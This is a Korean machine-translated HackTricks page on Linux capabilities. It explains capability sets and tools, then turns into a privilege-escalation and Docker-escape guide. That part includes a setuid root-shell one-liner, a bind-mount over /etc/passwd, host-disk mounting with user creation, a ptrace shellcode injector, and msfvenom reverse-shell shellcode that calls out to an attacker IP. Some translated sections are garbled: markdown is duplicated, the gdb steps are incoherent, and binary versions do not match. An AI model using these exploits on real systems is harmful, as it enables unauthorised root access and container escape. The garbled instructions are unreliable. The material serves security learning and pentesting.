# Linux Capabilities

<details>

<summary><strong>htARTE (HackTricks AWS Red Team Expert)</strong>를 통해 AWS 해킹을 처음부터 전문가까지 배워보세요<strong>!</strong></summary>

HackTricks를 지원하는 다른 방법:

* **회사를 HackTricks에서 광고하거나 HackTricks를 PDF로 다운로드**하려면 [**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)를 확인하세요!
* [**공식 PEASS & HackTricks 스웨그**](https://peass.creator-spring.com)를 얻으세요.
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)를 발견하세요. 독점적인 [**NFTs**](https://opensea.io/collection/the-peass-family) 컬렉션입니다.
* 💬 [**Discord 그룹**](https://discord.gg/hRep4RUj7f) 또는 [**텔레그램 그룹**](https://t.me/peass)에 **참여**하거나 **Twitter** 🐦 [**@carlospolopm**](https://twitter.com/hacktricks_live)를 **팔로우**하세요.
* **Hacking 트릭을 공유하려면** [**HackTricks**](https://github.com/carlospolop/hacktricks) 및 [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github 저장소에 PR을 제출하세요.

</details>

<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/)은 **스페인**에서 가장 관련성 높은 사이버 보안 행사이자 **유럽**에서 가장 중요한 행사 중 하나입니다. **기술적인 지식을 촉진**하기 위한 미션을 가진 이 회의는 모든 분야의 기술 및 사이버 보안 전문가들에게 끓어오르는 만남의 장입니다.\\

{% embed url="https://www.rootedcon.com/" %}

## Linux Capabilities

Linux 기능은 **루트 권한을 더 작고 구별된 단위로 분할**하여 프로세스가 일부 권한을 가질 수 있도록 합니다. 이를 통해 불필요하게 완전한 루트 권한을 부여하지 않아 위험을 최소화할 수 있습니다.

### 문제:
- 일반 사용자는 제한된 권한을 가지고 있어 루트 액세스가 필요한 네트워크 소켓 열기와 같은 작업에 영향을 줍니다.

### 기능 세트:

1. **상속 (CapInh)**:
- **목적**: 부모 프로세스에서 전달된 기능을 결정합니다.
- **기능**: 새로운 프로세스가 생성될 때 이 세트에서 부모로부터 기능을 상속받습니다. 프로세스 생성 간에 특정 권한을 유지하는 데 유용합니다.
- **제한 사항**: 프로세스는 부모가 가지지 않은 기능을 얻을 수 없습니다.

2. **실제 (CapEff)**:
- **목적**: 프로세스가 현재 사용하는 실제 기능을 나타냅니다.
- **기능**: 커널이 다양한 작업에 대한 허가를 부여하기 위해 확인하는 기능 세트입니다. 파일의 경우, 이 세트는 파일의 허용된 기능이 실제로 사용되는지 여부를 나타내는 플래그일 수 있습니다.
- **중요성**: 실제 세트는 즉각적인 권한 확인에 중요하며, 프로세스가 사용할 수 있는 활성 기능 세트로 작동합니다.

3. **허용 (CapPrm)**:
- **목적**: 프로세스가 가질 수 있는 최대 기능 세트를 정의합니다.
- **기능**: 프로세스는 허용된 세트에서 기능을 상승시켜 실제 세트에 추가할 수 있으며, 허용된 세트에서 기능을 삭제할 수도 있습니다.
- **경계**: 이는 프로세스가 미리 정의된 권한 범위를 초과하지 않도록 프로세스가 가질 수 있는 기능의 상한선 역할을 합니다.

4. **바운딩 (CapBnd)**:
- **목적**: 프로세스가 수명 동안 얻을 수 있는 기능에 한계를 설정합니다.
- **기능**: 프로세스가 상속 가능한 세트 또는 허용된 세트에 특정 기능을 가지고 있더라도, 바운딩 세트에 해당 기능이 포함되어 있지 않으면 해당 기능을 얻을 수 없습니다.
- **사용 사례**: 이 세트는 프로세스의 권한 상승 가능성을 제한하여 추가적인 보안 계층을 추가하는 데 특히 유용합니다.

5. **환경 (CapAmb)**:
- **목적**: 일반적으로 프로세스의 기능을 완전히 재설정하는 `execve` 시스템 호출에서 특정 기능을 유지할 수 있게 합니다.
- **기능**: 파일 기능이 없는 비-SUID 프로그램이 특정 권한을 유지할 수 있도록 보장합니다.
- **제한 사항**: 이 세트의 기능은 상속 가능한 세트와 허용된 세트의 제약 조건에 따라 프로세스의 허용된 권한을 초과하지 않도록 보장합니다.
```python
# Code to demonstrate the interaction of different capability sets might look like this:
# Note: This is pseudo-code for illustrative purposes only.
def manage_capabilities(process):
if process.has_capability('cap_setpcap'):
process.add_capability_to_set('CapPrm', 'new_capability')
process.limit_capabilities('CapBnd')
process.preserve_capabilities_across_execve('CapAmb')
```
추가 정보는 다음을 참조하십시오:

* [https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work](https://blog.container-solutions.com/linux-capabilities-why-they-exist-and-how-they-work)
* [https://blog.ploetzli.ch/2014/understanding-linux-capabilities/](https://blog.ploetzli.ch/2014/understanding-linux-capabilities/)

## 프로세스 및 이진 파일의 기능

### 프로세스 기능

특정 프로세스의 기능을 확인하려면 /proc 디렉토리의 **status** 파일을 사용하십시오. Linux 기능과 관련된 정보에만 초점을 맞추기 위해 더 많은 세부 정보를 제공합니다.\
모든 실행 중인 프로세스에 대해 기능 정보는 스레드별로 유지되며, 파일 시스템의 이진 파일에 대해서는 확장 속성에 저장됩니다.

기능은 /usr/include/linux/capability.h에서 정의된 것을 찾을 수 있습니다.

현재 프로세스의 기능은 `cat /proc/self/status` 또는 `capsh --print`를 사용하여 찾을 수 있으며, 다른 사용자의 기능은 `/proc/<pid>/status`에서 찾을 수 있습니다.
```bash
cat /proc/1234/status | grep Cap
cat /proc/$$/status | grep Cap #This will print the capabilities of the current process
```
다음 명령은 대부분의 시스템에서 5개의 줄을 반환해야 합니다.

* CapInh = 상속된 권한
* CapPrm = 허용된 권한
* CapEff = 유효한 권한
* CapBnd = 바운딩 세트
* CapAmb = 환경 권한 세트
```bash
#These are the typical capabilities of a root owned process (all)
CapInh: 0000000000000000
CapPrm: 0000003fffffffff
CapEff: 0000003fffffffff
CapBnd: 0000003fffffffff
CapAmb: 0000000000000000
```
이 16진수 숫자들은 의미가 없습니다. capsh 유틸리티를 사용하여 이를 능력(capabilities) 이름으로 디코딩할 수 있습니다.
```bash
capsh --decode=0000003fffffffff
0x0000003fffffffff=cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,37
```
지금 `ping`에서 사용되는 **capabilities**을 확인해 봅시다:
```bash
cat /proc/9491/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000000000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
이 방법도 작동하지만, 더 간단한 방법이 있습니다. 실행 중인 프로세스의 능력을 확인하려면, **getpcaps** 도구를 사용하고 그 뒤에 프로세스 ID (PID)를 입력하면 됩니다. 또한, 프로세스 ID의 목록을 제공할 수도 있습니다.
```bash
getpcaps 1234
```
다음은 `tcpdump`의 기능을 확인하는 것입니다. 이를 위해 이진 파일에 충분한 기능(`cap_net_admin` 및 `cap_net_raw`)을 부여하여 네트워크를 스니핑할 수 있습니다 (_tcpdump는 프로세스 9562에서 실행 중입니다_):

```plaintext
$ getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```

As we can see, `tcpdump` has been granted the `cap_net_admin` and `cap_net_raw` capabilities. These capabilities allow the binary to perform network sniffing operations.
```bash
#The following command give tcpdump the needed capabilities to sniff traffic
$ setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump

$ getpcaps 9562
Capabilities for `9562': = cap_net_admin,cap_net_raw+ep

$ cat /proc/9562/status | grep Cap
CapInh:    0000000000000000
CapPrm:    0000000000003000
CapEff:    0000000000003000
CapBnd:    0000003fffffffff
CapAmb:    0000000000000000

$ capsh --decode=0000000000003000
0x0000000000003000=cap_net_admin,cap_net_raw
```
주어진 기능은 이진 파일의 기능과 일치합니다.\
_getpcaps_ 도구는 **capget()** 시스템 호출을 사용하여 특정 스레드에 대한 사용 가능한 기능을 조회합니다. 이 시스템 호출은 PID만 제공하면 더 많은 정보를 얻을 수 있습니다.

### 이진 파일의 기능

이진 파일은 실행 중에 사용할 수 있는 기능을 가질 수 있습니다. 예를 들어, `ping` 이진 파일에는 `cap_net_raw` 기능이 매우 일반적으로 포함되어 있습니다:
```bash
getcap /usr/bin/ping
/usr/bin/ping = cap_net_raw+ep
```
다음을 사용하여 **기능을 가진 이진 파일을 검색**할 수 있습니다:
```bash
getcap -r / 2>/dev/null
```
### capsh를 사용하여 권한을 제거하기

CAP\_NET\_RAW 권한을 _ping_에서 제거하면 ping 유틸리티가 더 이상 작동하지 않아야 합니다.
```bash
capsh --drop=cap_net_raw --print -- -c "tcpdump"
```
제외하고 _capsh_ 자체의 출력물 외에도 _tcpdump_ 명령 자체도 오류를 발생시켜야 합니다.

> /bin/bash: /usr/sbin/tcpdump: Operation not permitted

이 오류는 ping 명령이 ICMP 소켓을 열 수 없도록 허용되지 않았음을 명확히 보여줍니다. 이제 우리는 이것이 예상대로 작동한다는 것을 확실히 알게 되었습니다.

### 권한 제거

바이너리의 권한을 제거할 수 있습니다.
```bash
setcap -r </path/to/binary>
```
## 사용자 권한

**사용자에게 권한을 할당하는 것도 가능**한 것 같습니다. 이는 아마도 사용자가 실행하는 모든 프로세스가 사용자의 권한을 사용할 수 있음을 의미할 것입니다.\
[이](https://unix.stackexchange.com/questions/454708/how-do-you-add-cap-sys-admin-permissions-to-user-in-centos-7), [이](http://manpages.ubuntu.com/manpages/bionic/man5/capability.conf.5.html) 및 [이](https://stackoverflow.com/questions/1956732/is-it-possible-to-configure-linux-capabilities-per-user)를 기반으로 특정 사용자에게 권한을 부여하기 위해 몇 가지 파일을 구성해야 합니다. 그러나 각 사용자에게 권한을 할당하는 파일은 `/etc/security/capability.conf`입니다.\
파일 예시:
```bash
# Simple
cap_sys_ptrace               developer
cap_net_raw                  user1

# Multiple capablities
cap_net_admin,cap_net_raw    jrnetadmin
# Identical, but with numeric values
12,13                        jrnetadmin

# Combining names and numerics
cap_sys_admin,22,25          jrsysadmin
```
## 환경 Capabilities

다음 프로그램을 컴파일하면 **capabilities을 제공하는 환경에서 bash 쉘을 실행**할 수 있습니다.

{% code title="ambient.c" %}
```c
/*
* Test program for the ambient capabilities
*
* compile using:
* gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
* Set effective, inherited and permitted capabilities to the compiled binary
* sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
*
* To get a shell with additional caps that can be inherited do:
*
* ./ambient /bin/bash
*/

#include <stdlib.h>
#include <stdio.h>
#include <string.h>
#include <errno.h>
#include <sys/prctl.h>
#include <linux/capability.h>
#include <cap-ng.h>

static void set_ambient_cap(int cap) {
int rc;
capng_get_caps_process();
rc = capng_update(CAPNG_ADD, CAPNG_INHERITABLE, cap);
if (rc) {
printf("Cannot add inheritable cap\n");
exit(2);
}
capng_apply(CAPNG_SELECT_CAPS);
/* Note the two 0s at the end. Kernel checks for these */
if (prctl(PR_CAP_AMBIENT, PR_CAP_AMBIENT_RAISE, cap, 0, 0)) {
perror("Cannot set cap");
exit(1);
}
}
void usage(const char * me) {
printf("Usage: %s [-c caps] new-program new-args\n", me);
exit(1);
}
int default_caplist[] = {
CAP_NET_RAW,
CAP_NET_ADMIN,
CAP_SYS_NICE,
-1
};
int * get_caplist(const char * arg) {
int i = 1;
int * list = NULL;
char * dup = strdup(arg), * tok;
for (tok = strtok(dup, ","); tok; tok = strtok(NULL, ",")) {
list = realloc(list, (i + 1) * sizeof(int));
if (!list) {
perror("out of memory");
exit(1);
}
list[i - 1] = atoi(tok);
list[i] = -1;
i++;
}
return list;
}
int main(int argc, char ** argv) {
int rc, i, gotcaps = 0;
int * caplist = NULL;
int index = 1; // argv index for cmd to start
if (argc < 2)
usage(argv[0]);
if (strcmp(argv[1], "-c") == 0) {
if (argc <= 3) {
usage(argv[0]);
}
caplist = get_caplist(argv[2]);
index = 3;
}
if (!caplist) {
caplist = (int * ) default_caplist;
}
for (i = 0; caplist[i] != -1; i++) {
printf("adding %d to ambient list\n", caplist[i]);
set_ambient_cap(caplist[i]);
}
printf("Ambient forking shell\n");
if (execv(argv[index], argv + index))
perror("Cannot exec");
return 0;
}
```
{% code %}
```bash
gcc -Wl,--no-as-needed -lcap-ng -o ambient ambient.c
sudo setcap cap_setpcap,cap_net_raw,cap_net_admin,cap_sys_nice+eip ambient
./ambient /bin/bash
```
**컴파일된 환경 바이너리에서 실행되는 bash** 내부에서 **새로운 권한**을 관찰할 수 있습니다 (일반 사용자는 "현재" 섹션에서 어떠한 권한도 가지고 있지 않을 것입니다).
```bash
capsh --print
Current: = cap_net_admin,cap_net_raw,cap_sys_nice+eip
```
{% hint style="danger" %}
허용된 세트와 상속 가능한 세트에 **동시에 존재하는 기능만 추가**할 수 있습니다.
{% endhint %}

### 기능 인식/기능 무지한 이진 파일

**기능 인식 이진 파일은 환경에서 제공된 새로운 기능을 사용하지 않**지만, **기능 무지한 이진 파일은** 거부하지 않으므로 사용합니다. 이로 인해 기능 무지한 이진 파일은 이진 파일에 기능을 부여하는 특수 환경에서 취약해집니다.

## 서비스 기능

기본적으로 **루트로 실행되는 서비스는 모든 기능이 할당**되며, 때로는 이것이 위험할 수 있습니다.\
따라서 **서비스 구성** 파일을 사용하여 서비스가 불필요한 권한으로 실행되지 않도록 하고자 하는 **기능**과 **사용자**를 지정할 수 있습니다.
```bash
[Service]
User=bob
AmbientCapabilities=CAP_NET_BIND_SERVICE
```
## Docker 컨테이너의 Capabilities

기본적으로 Docker는 컨테이너에 몇 가지 capabilities를 할당합니다. 이러한 capabilities가 무엇인지 확인하는 것은 매우 쉽습니다. 다음을 실행하여 확인할 수 있습니다:
```bash
docker run --rm -it  r.j3ss.co/amicontained bash
Capabilities:
BOUNDING -> chown dac_override fowner fsetid kill setgid setuid setpcap net_bind_service net_raw sys_chroot mknod audit_write setfcap

# Add a capabilities
docker run --rm -it --cap-add=SYS_ADMIN r.j3ss.co/amicontained bash

# Add all capabilities
docker run --rm -it --cap-add=ALL r.j3ss.co/amicontained bash

# Remove all and add only one
docker run --rm -it  --cap-drop=ALL --cap-add=SYS_PTRACE r.j3ss.co/amicontained bash
```
<figure><img src="https://files.gitbook.com/v0/b/gitbook-x-prod.appspot.com/o/spaces%2F-L_2uGJGU7AVNRcqRvEi%2Fuploads%2FelPCTwoecVdnsfjxCZtN%2Fimage.png?alt=media&#x26;token=9ee4ff3e-92dc-471c-abfe-1c25e446a6ed" alt=""><figcaption></figcaption></figure>

​​​​​​​​​​[**RootedCON**](https://www.rootedcon.com/)은 **스페인**에서 가장 관련성 있는 사이버 보안 행사이며 **유럽**에서 가장 중요한 행사 중 하나입니다. **기술적인 지식을 촉진하는 미션**을 가지고 있는 이 회의는 모든 분야의 기술 및 사이버 보안 전문가들에게 열정적인 만남의 장입니다.

{% embed url="https://www.rootedcon.com/" %}

## 권한 상승/컨테이너 탈출

캐퍼빌리티는 **특권이 있는 작업을 수행한 후 자신의 프로세스를 제한하려는 경우 유용**합니다 (예: chroot 설정 및 소켓에 바인딩한 후). 그러나 악성 명령 또는 인수를 전달하여 루트로 실행되도록 캐퍼빌리티를 악용할 수 있습니다.

`setcap`을 사용하여 프로그램에 캐퍼빌리티를 강제로 적용하고, `getcap`을 사용하여 이를 조회할 수 있습니다:
```bash
#Set Capability
setcap cap_net_raw+ep /sbin/ping

#Get Capability
getcap /sbin/ping
/sbin/ping = cap_net_raw+ep
```
`+ep`는 능력을 추가하는 것을 의미합니다. ("-"는 제거하는 것을 의미합니다.) Effective와 Permitted로 설정됩니다.

시스템이나 폴더에서 능력을 가진 프로그램을 식별하려면 다음을 사용합니다:
```bash
getcap -r / 2>/dev/null
```
### Exploitation example

다음 예제에서는 `/usr/bin/python2.6` 바이너리가 권한 상승 취약점을 가지고 있다고 가정합니다:
```bash
setcap cap_setuid+ep /usr/bin/python2.7
/usr/bin/python2.7 = cap_setuid+ep

#Exploit
/usr/bin/python2.7 -c 'import os; os.setuid(0); os.system("/bin/bash");'
```
**모든 사용자가 패킷을 스니핑할 수 있도록** `tcpdump`에 필요한 **기능(Capabilities)**:

```markdown
To allow any user to sniff packets using `tcpdump`, the following capabilities need to be granted:

1. `CAP_NET_RAW`: This capability allows the user to create raw sockets, which is necessary for packet sniffing.

To grant these capabilities to `tcpdump`, you can use the `setcap` command as follows:

```bash
sudo setcap cap_net_raw=eip /usr/sbin/tcpdump
```

After granting the necessary capabilities, any user will be able to run `tcpdump` and sniff packets without requiring root privileges.
```
```

`tcpdump`를 사용하여 모든 사용자가 패킷을 스니핑할 수 있도록 하려면 다음 기능(Capabilities)을 부여해야 합니다:

1. `CAP_NET_RAW`: 이 기능은 사용자가 패킷 스니핑에 필요한 raw 소켓을 생성할 수 있도록 합니다.

이러한 기능(Capabilities)을 `tcpdump`에 부여하려면 다음과 같이 `setcap` 명령을 사용할 수 있습니다:

```bash
sudo setcap cap_net_raw=eip /usr/sbin/tcpdump
```

필요한 기능(Capabilities)을 부여한 후에는 어떤 사용자든 `tcpdump`를 실행하고 root 권한이 필요하지 않고 패킷을 스니핑할 수 있게 됩니다.
```
```bash
setcap cap_net_raw,cap_net_admin=eip /usr/sbin/tcpdump
getcap /usr/sbin/tcpdump
/usr/sbin/tcpdump = cap_net_admin,cap_net_raw+eip
```
### "빈" 권한의 특수한 경우

[문서에서](https://man7.org/linux/man-pages/man7/capabilities.7.html) 알 수 있듯이, 프로그램 파일에 빈 권한 집합을 할당할 수 있으며, 이로 인해 실행하는 프로세스의 effective 및 saved set-user-ID를 0으로 변경하지만 해당 프로세스에 어떠한 권한도 부여하지 않을 수 있습니다. 즉, 다음과 같은 이진 파일이 있는 경우:

1. root가 소유하지 않은 경우
2. `SUID`/`SGID` 비트가 설정되지 않은 경우
3. 권한이 비어 있는 경우 (예: `getcap myelf`가 `myelf =ep`를 반환하는 경우)

그 이진 파일은 **root로 실행**됩니다.

## CAP\_SYS\_ADMIN

**[`CAP_SYS_ADMIN`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**은 매우 강력한 Linux 권한으로, 장치를 마운트하거나 커널 기능을 조작하는 등의 **관리 권한**을 가지고 있어 거의 root 수준으로 간주됩니다. 전체 시스템을 시뮬레이션하는 컨테이너에서 필수적이지만, **`CAP_SYS_ADMIN`은 권한 상승과 시스템 침해 가능성이 크기 때문에 컨테이너 환경에서는 중요한 보안 도전 과제**를 제공합니다. 따라서, 이 권한의 사용은 엄격한 보안 평가와 조심스러운 관리를 필요로 하며, **최소 권한 원칙**을 준수하고 공격 표면을 최소화하기 위해 응용 프로그램별 컨테이너에서 이 권한을 제거하는 것이 강력히 권장됩니다.

**이진 파일을 사용한 예시**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_admin+ep
```
파이썬을 사용하여 실제 _passwd_ 파일 위에 수정된 _passwd_ 파일을 마운트할 수 있습니다:
```bash
cp /etc/passwd ./ #Create a copy of the passwd file
openssl passwd -1 -salt abc password #Get hash of "password"
vim ./passwd #Change roots passwords of the fake passwd file
```
그리고 마지막으로 `/etc/passwd`에 수정된 `passwd` 파일을 **마운트**하세요:
```python
from ctypes import *
libc = CDLL("libc.so.6")
libc.mount.argtypes = (c_char_p, c_char_p, c_char_p, c_ulong, c_char_p)
MS_BIND = 4096
source = b"/path/to/fake/passwd"
target = b"/etc/passwd"
filesystemtype = b"none"
options = b"rw"
mountflags = MS_BIND
libc.mount(source, target, filesystemtype, mountflags, options)
```
그리고 "password"라는 비밀번호를 사용하여 **루트로 `su`** 할 수 있게 될 것입니다.

**환경 예시 (도커 탈출)**

다음을 사용하여 도커 컨테이너 내에서 활성화된 기능을 확인할 수 있습니다.
```
capsh --print
Current: = cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read+ep
Bounding set =cap_chown,cap_dac_override,cap_dac_read_search,cap_fowner,cap_fsetid,cap_kill,cap_setgid,cap_setuid,cap_setpcap,cap_linux_immutable,cap_net_bind_service,cap_net_broadcast,cap_net_admin,cap_net_raw,cap_ipc_lock,cap_ipc_owner,cap_sys_module,cap_sys_rawio,cap_sys_chroot,cap_sys_ptrace,cap_sys_pacct,cap_sys_admin,cap_sys_boot,cap_sys_nice,cap_sys_resource,cap_sys_time,cap_sys_tty_config,cap_mknod,cap_lease,cap_audit_write,cap_audit_control,cap_setfcap,cap_mac_override,cap_mac_admin,cap_syslog,cap_wake_alarm,cap_block_suspend,cap_audit_read
Securebits: 00/0x0/1'b0
secure-noroot: no (unlocked)
secure-no-suid-fixup: no (unlocked)
secure-keep-caps: no (unlocked)
uid=0(root)
gid=0(root)
groups=0(root)
```
이전 출력에서 SYS_ADMIN 기능이 활성화되어 있는 것을 확인할 수 있습니다.

* **마운트**

이를 통해 도커 컨테이너가 호스트 디스크를 마운트하고 자유롭게 액세스할 수 있습니다:
```bash
fdisk -l #Get disk name
Disk /dev/sda: 4 GiB, 4294967296 bytes, 8388608 sectors
Units: sectors of 1 * 512 = 512 bytes
Sector size (logical/physical): 512 bytes / 512 bytes
I/O size (minimum/optimal): 512 bytes / 512 bytes

mount /dev/sda /mnt/ #Mount it
cd /mnt
chroot ./ bash #You have a shell inside the docker hosts disk
```
* **전체 액세스**

이전 방법에서는 도커 호스트 디스크에 액세스할 수 있었습니다. 
호스트가 **ssh** 서버를 실행 중인 경우, 도커 호스트 디스크 내에서 사용자를 **생성**하고 SSH를 통해 액세스할 수 있습니다:
```bash
#Like in the example before, the first step is to mount the docker host disk
fdisk -l
mount /dev/sda /mnt/

#Then, search for open ports inside the docker host
nc -v -n -w2 -z 172.17.0.1 1-65535
(UNKNOWN) [172.17.0.1] 2222 (?) open

#Finally, create a new user inside the docker host and use it to access via SSH
chroot /mnt/ adduser john
ssh john@172.17.0.1 -p 2222
```
## CAP\_SYS\_PTRACE

**이는 호스트 내에서 실행 중인 프로세스 내부에 셸코드를 삽입하여 컨테이너를 탈출할 수 있다는 것을 의미합니다.** 호스트 내에서 실행 중인 프로세스에 액세스하기 위해 컨테이너는 적어도 **`--pid=host`**와 함께 실행되어야 합니다.

**[`CAP_SYS_PTRACE`](https://man7.org/linux/man-pages/man7/capabilities.7.html)**는 `ptrace(2)` 및 `process_vm_readv(2)`, `process_vm_writev(2)`와 같은 크로스 메모리 첨부 호출과 같은 디버깅 및 시스템 호출 추적 기능을 사용할 수 있는 능력을 부여합니다. 진단 및 모니터링 목적으로 강력하지만, `CAP_SYS_PTRACE`가 `ptrace(2)`에 대한 seccomp 필터와 같은 제한적인 조치 없이 활성화된 경우 시스템 보안을 심각하게 약화시킬 수 있습니다. 특히, [이와 같은 증명 (PoC)을 통해 시연된 것처럼](https://gist.github.com/thejh/8346f47e359adecd1d53), 다른 보안 제한, 특히 seccomp에 의해 부과된 제한을 우회하는 데 악용될 수 있습니다.

**바이너리 (파이썬) 예시**
```bash
getcap -r / 2>/dev/null
/usr/bin/python2.7 = cap_sys_ptrace+ep
```

```python
import ctypes
import sys
import struct
# Macros defined in <sys/ptrace.h>
# https://code.woboq.org/qt5/include/sys/ptrace.h.html
PTRACE_POKETEXT = 4
PTRACE_GETREGS = 12
PTRACE_SETREGS = 13
PTRACE_ATTACH = 16
PTRACE_DETACH = 17
# Structure defined in <sys/user.h>
# https://code.woboq.org/qt5/include/sys/user.h.html#user_regs_struct
class user_regs_struct(ctypes.Structure):
_fields_ = [
("r15", ctypes.c_ulonglong),
("r14", ctypes.c_ulonglong),
("r13", ctypes.c_ulonglong),
("r12", ctypes.c_ulonglong),
("rbp", ctypes.c_ulonglong),
("rbx", ctypes.c_ulonglong),
("r11", ctypes.c_ulonglong),
("r10", ctypes.c_ulonglong),
("r9", ctypes.c_ulonglong),
("r8", ctypes.c_ulonglong),
("rax", ctypes.c_ulonglong),
("rcx", ctypes.c_ulonglong),
("rdx", ctypes.c_ulonglong),
("rsi", ctypes.c_ulonglong),
("rdi", ctypes.c_ulonglong),
("orig_rax", ctypes.c_ulonglong),
("rip", ctypes.c_ulonglong),
("cs", ctypes.c_ulonglong),
("eflags", ctypes.c_ulonglong),
("rsp", ctypes.c_ulonglong),
("ss", ctypes.c_ulonglong),
("fs_base", ctypes.c_ulonglong),
("gs_base", ctypes.c_ulonglong),
("ds", ctypes.c_ulonglong),
("es", ctypes.c_ulonglong),
("fs", ctypes.c_ulonglong),
("gs", ctypes.c_ulonglong),
]

libc = ctypes.CDLL("libc.so.6")

pid=int(sys.argv[1])

# Define argument type and respone type.
libc.ptrace.argtypes = [ctypes.c_uint64, ctypes.c_uint64, ctypes.c_void_p, ctypes.c_void_p]
libc.ptrace.restype = ctypes.c_uint64

# Attach to the process
libc.ptrace(PTRACE_ATTACH, pid, None, None)
registers=user_regs_struct()

# Retrieve the value stored in registers
libc.ptrace(PTRACE_GETREGS, pid, None, ctypes.byref(registers))
print("Instruction Pointer: " + hex(registers.rip))
print("Injecting Shellcode at: " + hex(registers.rip))

# Shell code copied from exploit db. https://github.com/0x00pf/0x00sec_code/blob/master/mem_inject/infect.c
shellcode = "\x48\x31\xc0\x48\x31\xd2\x48\x31\xf6\xff\xc6\x6a\x29\x58\x6a\x02\x5f\x0f\x05\x48\x97\x6a\x02\x66\xc7\x44\x24\x02\x15\xe0\x54\x5e\x52\x6a\x31\x58\x6a\x10\x5a\x0f\x05\x5e\x6a\x32\x58\x0f\x05\x6a\x2b\x58\x0f\x05\x48\x97\x6a\x03\x5e\xff\xce\xb0\x21\x0f\x05\x75\xf8\xf7\xe6\x52\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x8d\x3c\x24\xb0\x3b\x0f\x05"

# Inject the shellcode into the running process byte by byte.
for i in xrange(0,len(shellcode),4):
# Convert the byte to little endian.
shellcode_byte_int=int(shellcode[i:4+i].encode('hex'),16)
shellcode_byte_little_endian=struct.pack("<I", shellcode_byte_int).rstrip('\x00').encode('hex')
shellcode_byte=int(shellcode_byte_little_endian,16)

# Inject the byte.
libc.ptrace(PTRACE_POKETEXT, pid, ctypes.c_void_p(registers.rip+i),shellcode_byte)

print("Shellcode Injected!!")

# Modify the instuction pointer
registers.rip=registers.rip+2

# Set the registers
libc.ptrace(PTRACE_SETREGS, pid, None, ctypes.byref(registers))
print("Final Instruction Pointer: " + hex(registers.rip))

# Detach from the process.
libc.ptrace(PTRACE_DETACH, pid, None, None)
```
**바이너리 예시 (gdb)**

`ptrace` 능력을 가진 `gdb`:
```
/usr/bin/gdb = cap_sys_ptrace+ep
```
# gdb를 통해 메모리에 주입하기 위해 msfvenom을 사용하여 쉘코드를 생성합니다.

1. 먼저, 다음 명령을 사용하여 msfvenom을 실행합니다.
```bash
msfvenom -p linux/x86/shell_reverse_tcp LHOST=<attacker IP> LPORT=<attacker port> -f c -b "\x00"
```
2. 위 명령에서 `<attacker IP>`와 `<attacker port>`를 공격자의 IP 주소와 포트 번호로 대체합니다.
3. `-f c` 옵션은 C 언어 형식으로 쉘코드를 출력하도록 지정합니다.
4. `-b "\x00"` 옵션은 널 바이트를 피하기 위해 쉘코드에서 제외할 문자를 지정합니다.
5. 명령을 실행하면 쉘코드가 출력됩니다.
6. 이제 gdb를 사용하여 쉘코드를 메모리에 주입합니다.

```bash
gdb -q <binary>
```
7. `<binary>`에는 쉘코드를 주입할 실행 파일의 경로를 입력합니다.
8. gdb가 실행되면 다음 명령을 입력하여 쉘코드를 메모리에 주입합니다.
```bash
set disassembly-flavor intel
b main
r
p system
set {int}($esp) = <address>
c
```
9. `set disassembly-flavor intel` 명령은 어셈블리 코드를 Intel 구문으로 표시하도록 설정합니다.
10. `b main` 명령은 `main` 함수에 중단점을 설정합니다.
11. `r` 명령은 프로그램을 실행합니다.
12. `p system` 명령은 `system` 함수의 주소를 확인합니다.
13. `<address>`에는 `system` 함수의 주소를 입력합니다.
14. `set {int}($esp) = <address>` 명령은 스택의 맨 위에 `system` 함수의 주소를 설정합니다.
15. `c` 명령은 프로그램을 계속 실행하여 쉘코드를 실행합니다.
16. 이제 쉘코드가 메모리에 주입되어 실행됩니다.
```python
# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.11 LPORT=9001 -f py -o revshell.py
buf =  b""
buf += b"\x6a\x29\x58\x99\x6a\x02\x5f\x6a\x01\x5e\x0f\x05"
buf += b"\x48\x97\x48\xb9\x02\x00\x23\x29\x0a\x0a\x0e\x0b"
buf += b"\x51\x48\x89\xe6\x6a\x10\x5a\x6a\x2a\x58\x0f\x05"
